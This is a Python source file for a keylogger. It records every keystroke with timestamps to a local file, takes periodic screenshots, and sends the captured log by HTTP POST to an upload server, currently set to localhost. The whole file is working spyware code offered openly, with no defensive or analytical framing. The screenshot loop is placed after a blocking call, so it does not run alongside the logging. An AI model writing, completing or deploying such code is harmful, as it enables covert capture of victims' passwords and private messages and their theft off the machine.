from pynput.keyboard import Listener, Key
import datetime
import time
import pyautogui
import socket
import requests

# Define the callback function to handle key press events
def on_press_function(key):
    # Write the pressed key to the file without single quotes
    with open("keylog2.txt", "a") as f:
        # Check if a special key is pressed, such as Enter, space, backspace (for deletion), etc
        if key == Key.enter:
            # Write a newline character to separate phrases
            f.write(f" - {datetime.datetime.now()}\n")
            f.write("\n")
        elif key == Key.space:
            # Write a space character to separate words
            f.write(" ")
        elif key == Key.backspace:
            f.write("[BACKSPACE]")
        else:
            f.write(str(key).strip("'"))

def capture_screenshot():
    # Generate a unique filename using the current timestamp
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{timestamp}.png"

    # Capture the screenshot and save it
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

def send_file():
    # Specify the URL of the server
    server_url = "http://localhost:80/upload"

    # Read the content of the file
    with open("keylog2.txt", "rb") as file:
        file_content = file.read()

    # Prepare the HTTP headers and data
    headers = {'Content-Type': 'application/octet-stream'}  # Specify the Content-Type as binary data
    data = file_content

    try:
        # Send the POST request to the server
        response = requests.post(server_url, headers=headers, data=data)
        
        # Check the response status
        if response.status_code == 200:
            print("File sent successfully.")
        else:
            print(f"Failed to send file. Server returned status code: {response.status_code}")
    except requests.exceptions.ConnectionError:
        print("Connection to the server failed. Make sure the server is running.")

# Create the listener object and attach the callback function
with Listener(on_press=on_press_function) as listener:
    try:
        # Start the listener to begin capturing keyboard events
        listener.join()
        while True:
            capture_screenshot()
            time.sleep(10)
    except KeyboardInterrupt:
        # Handle CTRL+C to terminate the program gracefully
        print("\nProgram terminated by user.")
        with open("keylog2.txt", "a") as f:
            f.write("\n")
        send_file()  # Call send_file() here so that the file is sent before exiting
